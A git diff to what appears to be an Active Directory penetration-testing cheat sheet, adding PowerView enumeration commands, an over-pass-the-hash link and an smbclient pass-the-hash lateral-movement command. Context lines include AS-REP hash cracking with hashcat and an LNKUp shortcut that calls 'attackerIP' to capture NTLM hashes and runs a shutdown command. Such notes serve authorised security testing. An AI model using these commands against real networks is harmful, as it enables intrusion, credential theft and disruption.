@@ -81,10 +81,21 @@ hashcat -m 18200 'asrep-roast.hashes' -a 0 ./wordlists/rockyou.txt
 
 # Authenticated enumeration
 
+### Domain policy using PowerView
+```
+Get-DomainPolicy
+(Get-DomainPolicy)."System Access"
+```
+
 ### MISC Enumeration commands
 Recursive search for *Domain Admins* members
 ```
 dsquery group -name "Domain Admins" | dsget group -expand -members
+```
+
+### Get Net session
+```
+Get-NetComputer | Get-NetSession
 ```
 
 ### Active Directory user and computer account description
@@ -227,7 +238,7 @@ You can after choose to Relay the *NetNTLM* hash or crack it.
 - https://github.com/Plazmaz/LNKUp
 Use --execute to specify a command to run when the shortcut is double clicked 
 ```
- lnkup.py --host attackerIP --type ntlm --output out.lnk --execute "shutdown /s"
+lnkup.py --host attackerIP --type ntlm --output out.lnk --execute "shutdown /s"
 ```
 
 Using PowerShell
@@ -621,6 +632,7 @@ print binascii.hexlify(hash)
 ```
 
 ### Over-Pass-The-hash
+- https://medium.com/r3d-buck3t/play-with-hashes-over-pass-the-hash-attack-2030b900562d
 - blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash
 
 Use the user or computer NTLM hash to request Kerberos tickets.
@@ -684,6 +696,12 @@ PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 ### Forest Trust
 - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755700(v=ws.10)?redirectedfrom=MSDN
 
+# Lateral movement
+
+smbclient authentication using NTLM hash
+```
+smbclient //192.168.0.10/C$ -U corp.company.com/jdoe --pw-nt-hash <NT hash>
+```
 
 # Persistence
 
